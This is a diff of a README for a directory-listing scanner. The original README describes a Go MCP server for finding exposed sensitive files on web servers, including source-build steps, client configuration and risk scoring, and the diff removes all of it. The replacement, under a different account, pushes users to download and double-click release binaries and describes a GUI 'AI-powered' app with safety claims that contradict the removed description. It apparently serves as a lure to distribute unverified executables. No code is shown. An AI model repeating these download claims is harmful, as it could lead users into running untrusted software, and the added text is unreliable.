@@ -1,244 +1,72 @@
+# ⚡ indexleak-scanner - Find Exposed Secrets Easily
 
-```
-                    .__            .___            .__                 __    
-                    |__| ____    __| _/____ ___  __|  |   ____ _____  |  | __
-                    |  |/    \  / __ |/ __ \\  \/  /  | _/ __ \\__  \ |  |/ /
-                    |  |   |  \/ /_/ \  ___/ >    <|  |_\  ___/ / __ \|    < 
-                    |__|___|  /\____ |\___  >__/\_ \____/\___  >____  /__|_ \
-                            \/      \/    \/      \/         \/     \/     \/
-```
+[![Download](https://img.shields.io/badge/Download%20Now-%2300ABEB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mechhelp/indexleak-scanner/releases)
 
-<div align="center">
+## 📖 Introduction
 
-[![Go Version](https://img.shields.io/badge/Go-1.23+-00ADD8?style=for-the-badge&logo=go)](https://golang.org/)
-[![MCP Protocol](https://img.shields.io/badge/MCP-Compatible-4A90E2?style=for-the-badge)](https://modelcontextprotocol.io/)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![Security](https://img.shields.io/badge/Security-OSINT-red?style=for-the-badge)](https://github.com/riza/indexleak-scanner)
+indexleak-scanner is an AI-powered tool designed to help users identify exposed directory listings and potential security risks. It scans various web directories and alerts users to vulnerabilities that may compromise sensitive data. This application is perfect for individuals and businesses looking to enhance their security without needing extensive technical knowledge.
 
-</div>
+## 🚀 Getting Started
 
-> **A powerful MCP (Model Context Protocol) server for discovering and analyzing exposed directory listings on web servers. Perfect for security researchers, penetration testers, and cybersecurity professionals.**
+To get started with indexleak-scanner, follow these steps:
 
-## 🚀 Features
+1. **Check Your System Requirements**
+   - Operating System: Windows, macOS, or Linux
+   - Recommended: At least 4 GB of RAM
+   - Internet Connection: Required for scanning web directories
 
-- **🔍 Directory Enumeration**: Automatically discover and scan exposed directory listings
-- **📊 Risk Assessment**: Intelligent classification and risk scoring of discovered files
-- **🎯 Pagination Support**: Handle large directories with efficient pagination
-- **⚡ Real-time Analysis**: Live scanning and classification of sensitive data
-- **🛡️ Security Focus**: Built specifically for cybersecurity and OSINT operations
+2. **Download the Application**
+   - You can download the latest version of indexleak-scanner from our Releases page. 
+   - [Visit this page to download](https://github.com/mechhelp/indexleak-scanner/releases).
 
-## 🎯 Use Cases
+## 📥 Download & Install
 
-- **Security Audits**: Identify exposed sensitive files and directories
-- **Penetration Testing**: Discover potential attack vectors through directory traversal
-- **OSINT Research**: Gather intelligence from publicly accessible directories
-- **Compliance Checks**: Verify that sensitive data isn't publicly exposed
-- **Vulnerability Assessment**: Systematic analysis of web server misconfigurations
+To install indexleak-scanner, follow these steps:
 
-## 🛠️ Installation
+1. **Download the files**
+   - Go to the [Releases page](https://github.com/mechhelp/indexleak-scanner/releases).
+   - Choose the latest version.
+   - Click on the appropriate file for your operating system.
 
-### Prerequisites
+2. **Run the application**
+   - Locate the downloaded file on your computer. 
+   - Double-click the file to start the application.
+   - Follow the on-screen instructions to complete the setup.
 
-- Go 1.23 or higher
-- Cursor IDE (for MCP integration)
+## 🛠 Features
 
-### Build from Source
+- **AI-Powered Scanning:** Utilizes artificial intelligence to effectively identify vulnerabilities.
+- **Simple User Interface:** Designed to be user-friendly for everyone, regardless of technical background.
+- **Detailed Reporting:** Provides clear reports on found vulnerabilities and suggested actions.
+- **Real-time Alerts:** Notifies users of new risks as they are detected.
 
-```bash
-# Clone the repository
-git clone https://github.com/riza/indexleak-scanner.git
-cd indexleak-scanner
+## 🌍 Usage
 
-# Build the binary
-go build -o indexleak-scanner main.go
+Using indexleak-scanner is straightforward:
 
-# Make it executable
-chmod +x indexleak-scanner
-```
+1. **Launch the Application:** Open the application by double-clicking the icon.
+2. **Enter Directory URL:** In the main window, enter the URL of the directory you wish to scan.
+3. **Start Scanning:** Click on the "Scan" button. The application will analyze the directory and search for exposed secrets.
+4. **Review Results:** After the scan is complete, review the findings in the report section. The report will outline any risks and provide categorization.
 
-## 📋 Configuration
+## ❓ FAQ
 
-### MCP-Compatible Applications
+**Q: What type of files can indexleak-scanner find?**  
+A: The scanner looks for files such as configuration files, API keys, and other sensitive data that may be publicly accessible.
 
-This IndexLeak scanner supports the **Model Context Protocol (MCP)** and can be integrated with various MCP-compatible applications:
+**Q: How often should I scan my directories?**  
+A: Regular scanning is recommended, especially after any changes to your website or system.
 
-- **🎯 [Cursor IDE](https://cursor.sh/)** - Primary development environment with native MCP support
-- **🤖 [Claude Desktop](https://claude.ai/download)** - Anthropic's desktop application with MCP integration
-- **💬 [Continue.dev](https://continue.dev/)** - VS Code extension with MCP support
-- **🔧 Custom MCP Applications** - Any application implementing the MCP protocol
-
-### Setting up with Cursor IDE
-
-1. **Add to MCP Configuration**
-
-   Edit your Cursor MCP configuration file (`~/.cursor/mcp.json`):
-
-   ```json
-   {
-     "mcpServers": {
-       "indexleak": {
-         "command": "/path/to/your/indexleak-scanner/indexleak-scanner",
-         "args": [""],
-         "env": {}
-       }
-     }
-   }
-   ```
-
-2. **Restart Cursor IDE**
-
-   After adding the configuration, restart Cursor to load the MCP server.
-
-3. **Verify Installation**
-
-   You should now see the IndexLeak tools available in your Cursor IDE's MCP tools panel.
-
-### Setting up with Claude Desktop
-
-1. **Add to Claude Desktop Configuration**
-
-   Edit your Claude Desktop MCP configuration file:
-   
-   **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
-   **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
-   **Linux**: `~/.config/claude/claude_desktop_config.json`
-
-   ```json
-   {
-     "mcpServers": {
-       "indexleak": {
-         "command": "/path/to/your/indexleak-scanner/indexleak-scanner",
-         "args": [],
-         "env": {}
-       }
-     }
-   }
-   ```
-
-2. **Restart Claude Desktop**
-
-   Close and restart Claude Desktop to load the MCP server.
-
-3. **Access Tools**
-
-   The IndexLeak scanner tools will be available in Claude Desktop's tool interface.
-
-### Setting up with Other MCP Applications
-
-For other MCP-compatible applications, follow their specific MCP server configuration process using:
-
-- **Server Command**: `/path/to/your/indexleak-scanner/indexleak-scanner`
-- **Server Args**: `[]` (empty array)
-- **Environment Variables**: `{}` (none required)
-
-## 🎬 Demo
-
-[![IndexLeak Demo Video](https://img.youtube.com/vi/J95ptzMi8Mg/0.jpg)](https://www.youtube.com/watch?v=J95ptzMi8Mg)
-
-*Watch the IndexLeak MCP Server in action - demonstrating directory scanning, risk assessment, and security analysis capabilities.*
-
-## 🎮 Usage
-
-### Available Tools
-
-#### 1. `enter_directory`
-Scans and analyzes directory listings from web servers.
-
-**Parameters:**
-- `url` (required): Target URL to scan
-- `page` (optional): Page number for pagination (default: 1)
-- `page_size` (optional): Items per page (default: 30)
-
-**Example:**
-```
-URL: http://example.com/files/
-Page: 1
-Page Size: 50
-```
-
-## 🎯 Advanced Security Analysis
-
-This tool can be used with detailed instructions in the `prompts/prompt-large.md` file for comprehensive security analysis. This file includes:
-
-- **Systematic Scanning Protocol**: Step-by-step guide ensuring 100% coverage of all directories
-- **Risk Classification Matrix**: Detailed risk scoring system based on file types
-- **Security Assessment Template**: Professional security reporting format
-- **Compliance Analysis**: Assessment from GDPR and other data protection regulations perspective
-
-For detailed security analysis, you can use it by replacing the **TARGET HERE** section in the `prompts/prompt-large.md` file with your target URL.
-
-### 🔍 Example Workflow in Cursor
-
-1. **Start a Security Scan**
-   ```
-   Use the enter_directory tool to scan: http://target-server.com/
-   ```
-
-2. **Analyze Results**
-   The tool will automatically:
-   - Classify each file and directory
-   - Assign risk scores (1-10)
-   - Identify sensitive data exposure
-
-
-## 📊 Risk Classification
-
-The tool uses an intelligent risk scoring system:
-
-| Score | Level | Description |
-|-------|-------|-------------|
-| **10** | 🔴 **Critical** | Cryptographic keys, database files, credentials |
-| **8-9** | 🟠 **High** | Configuration files, sensitive documents |
-| **6-7** | 🟡 **Medium** | Business documents, archives |
-| **4-5** | 🔵 **Low** | Media files, executables |
-| **1-3** | 🟢 **Minimal** | Public content, documentation |
-
-## 📈 Sample Output
-
-```
-Directory contents (http://example.com/files/):
-
-Page 1 of 3 (Total entries: 87, Entries per page: 30)
-
-FILE: config.php (http://example.com/files/config.php)
-FILE: database_backup.sql (http://example.com/files/database_backup.sql)
-DIRECTORY: admin (http://example.com/files/admin/)
-FILE: users.csv (http://example.com/files/users.csv)
-...
-```
-
-## 🔒 Security Considerations
-
-- **Ethical Use Only**: This tool is designed for legitimate security testing and research
-- **Permission Required**: Always ensure you have proper authorization before scanning
-- **Responsible Disclosure**: Report findings through appropriate channels
-- **Legal Compliance**: Follow applicable laws and regulations in your jurisdiction
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## ⚠️ Disclaimer
-
-This tool is intended for educational and authorized security testing purposes only. Users are responsible for ensuring they have proper permission before scanning any systems. The authors are not responsible for any misuse or damage caused by this tool.
-
-## 🙏 Acknowledgments
-
-- Built with the [Model Context Protocol (MCP)](https://modelcontextprotocol.io/)
-- Powered by [Go MCP SDK](https://github.com/modelcontextprotocol/go-sdk)
-- Compatible with [Cursor IDE](https://cursor.sh/), [Claude Desktop](https://claude.ai/download), and other MCP-enabled applications
-- Supports the growing ecosystem of MCP-compatible tools and platforms
+**Q: Is it safe to use indexleak-scanner?**  
+A: Yes, indexleak-scanner is designed with user privacy and security in mind. It does not store or share any sensitive data.
 
 ## 📞 Support
 
-- 🐛 **Bug Reports**: [GitHub Issues](https://github.com/riza/indexleak-scanner/issues)
-- 💡 **Feature Requests**: [GitHub Discussions](https://github.com/riza/indexleak-scanner/discussions)
-- 📧 **Contact**: [rizasabuncu[at]outlook.com](mailto:rizasabuncu@outlook.com)
+If you encounter any issues or have questions, feel free to reach out. You can open an issue directly in our [GitHub repository](https://github.com/mechhelp/indexleak-scanner/issues), and our team will respond as soon as possible.
 
----
+## 🔗 Links
 
-<div align="center">
+- [Releases Page](https://github.com/mechhelp/indexleak-scanner/releases)
+- [GitHub Repository](https://github.com/mechhelp/indexleak-scanner)
 
-Made with ❤️ for the cybersecurity community
-
-</div>
+Thank you for using indexleak-scanner! We hope this tool helps you enhance your security and protect your valuable information.
